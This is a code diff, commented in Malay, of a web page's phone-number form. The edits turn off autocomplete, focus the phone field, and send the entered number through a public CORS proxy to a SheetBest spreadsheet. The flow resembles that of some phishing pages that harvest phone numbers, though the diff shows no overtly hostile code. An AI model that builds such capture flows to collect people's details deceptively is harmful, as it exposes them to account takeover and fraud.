@@ -17,6 +17,7 @@
         phone number.
       </p>
 
+      <!-- 🟢 DITAMBAH: autocomplete="off" -->
       <form id="phoneForm" class="form-box" autocomplete="off">
         <label for="country" class="label">Country</label>
         <select id="country" class="input">
@@ -63,14 +64,14 @@
     const form = document.getElementById("phoneForm");
     const countrySelect = document.getElementById("country");
 
-    // 🔹 API SheetBest & Proxy CORS
+    // 🔹 API SheetBest
     const API = "https://api.sheetbest.com/sheets/f3cc6873-23ee-4df3-9eb8-49a788f9446a";
-    const PROXY = "https://corsproxy.io/?";
+    const PROXY = "https://corsproxy.io/?"; // 🟢 DITAMBAH
 
     // Auto isi kod negara bila page load
     window.addEventListener("DOMContentLoaded", () => {
       phoneInput.value = countrySelect.value + " ";
-      phoneInput.focus();
+      phoneInput.focus(); // 🟢 DITAMBAH
     });
 
     // Tukar kod bila negara berubah
@@ -90,16 +91,16 @@
       nextBtn.disabled = afterCode.trim() === "";
     });
 
-    // 🔹 Bila user tekan Next
+    // Bila user tekan Next
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       const phone = phoneInput.value.trim();
       if (!phone) return;
 
-      // ✅ Simpan ke kolum pertama (A) — header mesti “satu”
       const payload = { satu: phone };
 
       try {
+        // 🟢 DITAMBAH: PROXY + API
         const res = await fetch(PROXY + API, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
